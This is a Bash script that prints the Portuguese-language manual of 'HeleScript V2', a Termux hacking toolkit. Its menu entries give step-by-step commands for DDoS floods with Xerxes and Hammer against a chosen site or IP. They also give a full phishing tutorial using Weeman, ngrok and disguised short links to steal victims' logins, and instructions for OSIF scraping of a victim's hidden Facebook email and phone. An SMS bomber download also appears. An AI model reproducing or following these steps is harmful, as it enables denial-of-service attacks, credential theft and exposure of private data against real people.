unset MENU_DO_MANUAL

while [[ $MENU_DO_MANUAL -ne 12 ]]
do
	clear
	unset MENU_DO_MANUAL
	echo -e '
\033[1;36m              <---------------------------->
                   | \033[0m\033[1;33mMANUAL DA SCRIPT\033[0m\033[1;36m |
              <---------------------------->\033[0m


     \033[1;36m/---------------------------------------------\ \033[0m
    \033[1;36m l\033[0m \033[1;32m 1\033[0m\033[1;36m -\033[0m\033[1;31m Sobre a HeleScript V2                  \033[0m\033[1;36ml\033[0m
     \033[1;36ml\033[0m \033[1;32m 2\033[0m\033[1;36m -\033[0m\033[1;31m Sobre a atualização                    \033[0m\033[1;36ml\033[0m
    \033[1;36m l\033[0m  \033[1;32m3\033[0m\033[1;36m -\033[0m\033[1;31m Como bugar as travas do whats          \033[0m\033[1;36ml\033[0m
    \033[1;36m l\033[0m  \033[1;32m4\033[0m\033[1;36m - \033[0m\033[1;31mComo utilizar o xerxes                 \033[0m\033[1;36ml\033[0m
 \033[1;36m    l\033[0m  \033[1;32m5\033[0m\033[1;36m - \033[0m\033[1;31mComo utilizar o hammer                 \033[0m\033[1;36ml\033[0m
\033[1;36m     l \033[0m\033[1;32m 6\033[0m\033[1;36m - \033[0m\033[1;31mComo fazer pishing pelo weeman         \033[0m\033[1;36ml\033[0m
  \033[1;36m   l\033[0m\033[1;32m  7\033[0m\033[1;36m - \033[0m\033[1;31mPra q serve e como utilizar a osif     \033[0m\033[1;36ml\033[0m
\033[1;36m     l\033[0m \033[1;32m 8\033[0m\033[1;36m - \033[0m\033[1;31mPra q serve e como utilizar a red hawk \033[0m\033[1;36ml\033[0m
\033[1;36m     l\033[0m \033[1;32m 9\033[0m\033[1;36m - \033[0m\033[1;31mPra que serve o wget                   \033[0m\033[1;36ml\033[0m
\033[1;36m     l\033[0m\033[1;32m 10\033[0m\033[1;36m -\033[0m\033[1;31m Como utilizar o wget                   \033[0m\033[1;36ml\033[0m
 \033[1;36m    l\033[0m\033[1;32m 11\033[0m\033[1;36m -\033[0m\033[1;31m como usar o cmatrix,cowsay e o figlet  \033[0m\033[1;36ml\033[0m
    \033[1;36m l\033[0m \033[1;32m12\033[0m\033[1;36m -\033[0m\033[1;31m Voltar ao menu principal               \033[0m\033[1;36ml\033[0m
    \033[1;36m \---------------------------------------------/  \033[0m

\033[1;31mツ - Digite um dos números acima: \033[0m'
	read MENU_DO_MANUAL
	clear
	case "$MENU_DO_MANUAL" in
	   1)
	     GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '
\033[1;33mSOBRE A HELESCRIPT V2 OFC:\033[0m

\033[1;33mHistória:\033[0m

\033[1;34mA helescript é uma script cuja ideia de criação foi do Lil Helê. Então a primeira versão ele programou pra equipe Umbrella Corporation, cujo dono da equipe era um amigo dele.

Mas logo depois ele programou a versão 2 pra Speatec, Cujo dono da speatec é ele mesmo.
                                                                      
Na helescript V2 o Lil Helê obteve ajuda do TSA9a.\033[0m

\033[1;33mFunção da script:\033[0m

\033[1;34m•Personlizar o termux;
•Se defender de travas(Upar código pelo termux);
•Baixar/instalar coisas;
•Em uma opção da script, Oferece aulas/turoriais de hacking, e também um curso;

\033[0m
\033[1;33mCOMANDOS PARA INICIAR A HELESCRIPT VERSÃO 2 OFC\033[0m

\033[1;34m -> Primeiro baixe o termux na playstore e em seguida siga as instruções abaixo:\033[0m

\033[1;32m[1] Permitir que o termux acesse os seus arquivos e tals\033[0m
\033[1;34mtermux-setup-storage\033[0m

\033[1;32m[2] Atualizar repositórios\033[0m\033[1;34m
apt update
apt upgrade -y
\033[0m\033[1;32m
[3] Comando para instalar o git\033[0m\033[1;34m
pkg install git -y\033[0m

\033[1;32m[4] Comando pra baixar a script\033[0m\033[1;34m
git clone https://github.com/LilHele/HeleV2
\033[0m\033[1;32m
[5] Entrando na pasta da script e dando permissões pra mesma\033[0m\033[1;34m
ls
cd HeleV2
chmod +x *
\033[0m\033[1;32m
[6] Comando para iniciar a script\033[0m
\033[1;34m. ./HeleScript.sh\033[0m

\033[1;32mBy:\033[0m\033[1;34m Lil Helê\033[0m
'
	     echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
	     read SEGUE;;
	    2)
	     GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '
\033[1;33mMELHORIAS:\033[0m
\033[1;34m
-> Na versão dois da helescript, a script não fica toda em um arquivo.sh, Ela foi dividida em diversos arquivos.sh , pois assim fica fácil de desenvolver e fica mais organizado a script.

-> Opção de personalizar o termux melhorada, agora não fica duas linhas em branco no começo da personalização, e sim só uma.

-> explicações das aulas do treinamento melhoradas.
\033[0m\033[1;33m
RECURSOS NOVOS:\033[0m
\033[1;34m
-> O treinamento da script obteve mais aulas.

-> Novas ferramentas pra instalar na script\033[0m
'
	     echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
             read SEGUE;;
	    3)
             GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '\033[1;34mBugar travas do whats, É tipo fazer com que todas as mensagens que te enviem venham bugadas e logicamente as travas ctt e texto vai cair bugadas.

Basicamente é só apagar o arquivo: "/data/data/com.whatsapp/databases/axolotl.db", Depois é só fechar a janela do whats... caso a mesma esteja aberta, Que o código irá upar.

Ou seja oq essa script vai fazer é apagar o arquivo que eu citei anteriormente.
\033[0m\033[1;32m
Obs: \033[0m\033[1;34mIsso só funciona com root.\033[0m
'
	     echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
    	     read SEGUE;;
  	    4)
	     GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '\033[1;34mDepois de você baixar o Pack de ddos da script, faça os seguintes passos para realizar o ataque ddos usando o Xerxes.

-> Instale o clang no menu principal da script.
-> Abra uma nova aba no termux 
-> Digite: cd
-> Digite: cd XERXES
-> Digite: chmod +x *;ls
-> Digite: clang xerxes.c -o xerxes
-> Digite: ./xerxes (site) 80
\033[0m
\033[1;32mObs:\033[0m\033[1;34m Caso queira parar o ataque, Aperte no botão "ctrl" na barra ... e em seguida na letra "c", do teclado.\033[0m
'
             echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
             read SEGUE;;
	    5)
	     GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '\033[1;34mDepois de você baixar o Pack de ddos da script, faça os seguintes passos para realizar o ataque ddos usando o Xerxes.

-> instale o python2 no menu principal.

-> Abra uma nova aba no termux

-> Digite: cd

-> Digite: cd hammer

-> Digite: chmod +x *

-> Digite: ls

-> python hammer.py -s [ip] -p 80 -t 135
\033[0m
\033[1;33mAluno - Como parar o ataque ?
\033[0m
\033[1;34mAperte no botão "ctrl" e em seguida na letra "c" do teclado. Vale destacar que o "ctrl" está na barra do termux.

caso o ctrl não esteja aparecendo, Isso significa que ele está ocultado. Então para fazer o mesmo aparecer aperte no botão de diminuir volume (-) e em seguida na letra "k".\033[0m
'
             echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
             read SEGUE;;
  	    6)
	     GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '
\033[1;33m1) O QUE É PISHING:\033[0m
\033[1;34m
Bom, antes de tudo eu gostaria de falar sobre oq é pishing, Pishing é o invasor fazer um site fake simulando ser o verdadeiro de login. Sendo assim... o invasor manda para a vítima o site fake e usa alguma engenharia social/Mentira para fazer com que a mesma entre no site. Como Entre aqui e ganhe...

Enfim, Oq eu quero dizer é que quando a vítima colocar o seu login e senha, O invasor vai ver isso no seu terminal, Ou o login e senha vai ser enviado pro gmail do invasor.
\033[0m\033[1;33m
2) PRINCIPAIS PARTES DO PROCESSO:
\033[0m\033[1;34m
Eu (Lil Helê) dividir os principais passos em duas partes, Que são:

•REDE INTERNA;
•REDE EXTERNA;
\033[0m\033[1;33m
3) QUAL A DIFERENÇA ENTRE REDE INTERNA E REDE EXTERNA:\033[0m
\033[1;34m
Rede interna é só quem está na sua rede wi-fi, Ou seja o link do site fake, Só vai funcionar pra quem está na sua rede wi-fi.

Já em rede externa é o contrário, O link vai funcionar até pra quem estiver em outro estado. Como por exemplo: Se depare com a situação, vc está no acre e quer enviar o link pra uma pessoa de Brasília... Como o link é em rede externa o recebente vai conseguir acessar o link.
\033[0m\033[1;33m
4) PASSO A PASSO PARA FAZER O LINK EM REDE INTERNA:\033[0m
\033[1;34m
Primeiro instale/Baixe o git no menu principal, Escolhendo a opção 15.

Escolha a opção de atualizar os repositórios, Baixe também o python2, curl e o Perl.

E por fim.... instale o weeman no menu principal, digitando a opção 7.

Logo após isso, Abra uma outra aba no  termux, e digite esses comandos abaixo:\033[0m

\033[1;32m[1] entrando na pasta do weeman\033[0m\033[1;34m
cd weeman
\033[0m\033[1;32m
[2] Executando a script\033[0m\033[1;34m
python2 weeman.py
\033[0m\033[1;32m
[3] logo após executar vai aparecer uma coisa vermelha\033[0m\033[1;34m
set url LINK_DO_SITE_Q_DESEJA_CLONAR
\033[0m\033[1;32m
[4]\033[0m\033[1;34m
set action_url LINK_DO_SITE_Q_DESEJA_CLONAR
\033[0m\033[1;32m
[5]\033[0m
\033[1;34mrun


Após ter digitado "run", Vai surgir um link, e esse link é do site fake. E vale destacar aqui que esse link não vai funcionar em rede externa.

Para fixar o conteúdo desse título, Eu recomendo vc copiar e colar esse link no navegador, e em seguida digitar qualquer coisa na parte de login e senha. E depois voltar ao termux e oq vc digitou irá aparecer na aba do weeman.
\033[0m
\033[1;33m5) PASSO A PASSO PARA FAZER O LINK EM REDE EXTERNA:
\033[0m\033[1;34m
Obs: Para serguir esse tutorial vc tem que fazer o link em rede interna, E não ter fechado as abas.
\033[0m
\033[1;34m5.1) entre no site do ngrok e crie uma conta, Para obter o "Token":

O link do site do ngrok é https://ngrok.com/

Vale destacar que a sua conta por ser gratuita, Irá ficar disponível só por 15 dias.

Enfim, Logo após ter feito a sua conta, copie tudo da opção 3 Aonde começa com "Token".

5.2) BAIXANDO O PS.NGROK NO MENU PRINCIPAL:

Logo após ter copiado o Token... abra a aba aonde está sendo executado a script HELESCRIPT e escolha a opção 9.

5.3) CRIANDO O LINK PARA REDE EXTERNA:

Abra uma nova aba no termux, e digite
\033[0m\033[1;32m
[1]\033[0m\033[1;34m
./ngrok\033[0m\033[1;32m
[2] Copiando e colando o seu token\033[0m
\033[1;34m./ngrok TOKEN\033[0m\033[1;32m
[3] Criando o link\033[0m
\033[1;34m./ngrok http 8080

Logo após isso espere aquela parte aonde tá "offline", Ficar "online". E o link será criado...  o link certo é o que tá com https!

Vale destacar aqui que o certo é você encurtar o URL, Pois se n assim vai ficar muito suspeito, Vc mandar o site que o ngrok gerou pra sua vítima.

Eu aconselho esse site pra encurtar os seus sites fake abaixo, Pois vc pode personalizar pra ficar parecido com o real:

https://is.gd/
\033[0m'

             echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
             read SEGUE;;
	    7)
	     GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '\033[1;33m1) O QUE É A OSIF ?\033[0m
\033[1;34mA osif é uma script criada em python para obter informações de contas de Facebook.\033[0m

\033[1;33m2) QUAIS SÃO AS INFORMAÇÕES COLETADAS PELA OSIF:\033[0m
\033[1;34mInformações do tipo , data de nascimento que tá no Facebook, o número ou email, enfim a script consegue puxar esses dados mesmo se o usuário ativou a opção "somente eu posso ver meu gmail e número".

Agora você deve está pensando "Legal eu vou conseguir hackear contas do facebook com a osif agora Kk", porém não é assim! Então, vai tirando seu cavalinho da chuva, pois com a osif no máximo ela vai te ajudar a coletar informações do alvo.

Vale destacar que você precisa ter acesso a um face que seja amigo da pessoa que você queira coletar os dados.
\033[0m
\033[1;33mAluno - como assim ?
R=\033[0m\033[1;34m Para puxar os dados do facebook da vítima, tenha primeiro acesso a um Facebook que é amigo da vítima.
\033[0m
\033[1;33m3) PASSO A PASSO PARA UTILIZAR A SCRIPT OSIF:\033[0m
\033[1;34m
-> Baixe a osif no menu principal(Escolha a opção 9).

-> Baixe o pip no menu principal (escolha a opção 12).

-> Baixe o Python 2 no menu principal (escolha a opção 22)

Feito os passos acima , abra uma nova aba no termux, digite cd e siga as instruções abaixo:
\033[0m
\033[1;32m[1] Entrando na pasta da osif\033[0m
\033[1;34mcd OSIF\033[0m
\033[1;32m[2]\033[0m
\033[1;34mpip2 install -r requirements.txt\033[0m
\033[1;32m[3] iniciando a script\033[0m
\033[1;34mpython2 osif.py\033[0m

\033[1;33mexplicação:\033[0m
\033[1;34mUma vez tendo acesso a uma conta que no face é amigo da vítima, deveremos fazer o seguinte:

Na mesma apaga que vc iniciou a osif com python 2 osif.py digite:
\033[0m
\033[1;32m[1] digite isso abaixo no termux 
\033[0m\033[1;34mtoken
\033[0m\033[1;32m[2] digite o gmail da conta cujo você tem acesso que é amigo da vítima.\033[0m\033[1;34m
Exemplo@gmail.com\033[0m\033[1;32m
[3]\033[0m\033[1;34m
digite a senha desse face
\033[0m
\033[1;33mAviso: \033[0m\033[1;34mEu não sei se esse programa contém código malicioso, então tome cuidado.\033[0m
\033[1;32m[4] \033[0m\033[1;34m
python2 osif.py\033[0m
\033[1;32m[5] agora vamos puxar a data e os ids dos nossos amigos no face.\033[0m
\033[1;34mget_data
dump_id\033[0m
\033[1;32m[6] É aqui que vamos puxar os dados do face da vítima.\033[0m
\033[1;34mget_info
Nome_do_face_da_vitima

ツ - Depois de você digitar o nome do face da pessoa, irá aparecer na tela os dados desse face. Enfim, Agora caso queira sair do programa é exit, caso queira se deslogar do programa, digite rm_token.\033[0m
'
             echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
             read SEGUE;;
	    8)
	     GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '\033[1;33m1) O que é a red hawk e pra que serve?\033[0m
\033[1;34m
A red hawk é uma script muito útil para profissionais da área de pentest, pois com essa script da pra você scannear sites, para com isso coletar informações, e com essas informações checar se o site tem alguma vulnerabilidade, se os IPs e domínios estão certos e etc.
\033[0m
\033[1;33m2) Como utilizar a script?
\033[0m\033[1;34m
Faça todo o passo a passo abaixo:

-> Atualize os repositórios no menu principal, escolhendo a opção 5.

-> Baixe a script no menu principal, escolhendo a opção 8.

-> Instale o php no menu principal, escolhendo a opção 25.

-> Baixe o git no menu principal, escolhendo a opção 15.

-> Abra uma nova aba no termux e digite cd
\033[0m
\033[1;32m[1] Entre na pasta da script digitando isso abaixo:\033[0m
\033[1;34mcd RED_HAWK
\033[0m\033[1;32m[2] de permissão de execução pra script \033[0m
\033[1;34mchmod +x *\033[0m
\033[1;32m[3] Executando a script 
\033[0m\033[1;34mphp rhawk.php\033[0m
\033[1;32m[4] digite o site que você deseja fazer o scanner, mas tire o http ou https.\033[0m
\033[1;34mwww.exemplodesite.com
\033[0m\033[1;32m[5] \033[0m
\033[1;34m1 se for http ou 2 se for https
\033[0m
\033[1;33mObs:\033[0m \033[1;34mlogo em seguida aparecerá o menu principal da script, então é só escolher a opção desejada.\033[0m
'
             echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
             read SEGUE;;
	    9)
	     GRAFICO_DO_MENU_DO_MANUAL
  	     echo -e '\033[1;34mServe pra baixar coisas por link.\033[0m
'
             echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
             read SEGUE;;
	    10)
	     GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '\033[1;34mDepois de baixado o wget, abra uma nova aba no termux e siga as instruções abaixo:

wget -c (url)

Exemplo:

wget -c https://www.dropbox.com/s/wqn0q1agkm77umz/SMS%20Bomber_0.95.zip


Obs: Caso queira baixar, e ao mesmo tempo meio que mover pra uma determinada pasta é esse comando abaixo:

wget -c (url) (caminho) \033[0m
'
             echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
             read SEGUE;;
	    11)
	     GRAFICO_DO_MENU_DO_MANUAL
	     echo -e '\033[1;34mSão apenas animações, caso esteja curioso pra descobrir pra que serve cada um, siga os passos abaixo:
\033[0m
\033[1;33m1) Para usar o cmatrix:\033[0m

\033[1;34m-> Instale o cmatrix no menu principal.

-> abra uma nova aba no termux 

-> Digite: cmatrix

-> Para cancelar a animação aperte ctrl e depois aperte o c
\033[0m\033[1;33m
2) Para usar o figlet:
\033[0m\033[1;34m
-> Instale o figlet no menu principal da script.

-> Abra uma nova aba no termux 

-> digite: figlet digitealgoaqui
\033[0m
\033[1;33m3) Pra usar o cowsay:
\033[0m\033[1;34m
-> Instale o cowsay no menu principal da script 

-> abra uma nova aba no termux 

-> digite: cowsay digitealgoaqui \033[0m
'
             echo -e '\033[1;31mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
             read SEGUE;;
#Fim do caso do menu do manual
esac
#Fim do enquanto
done
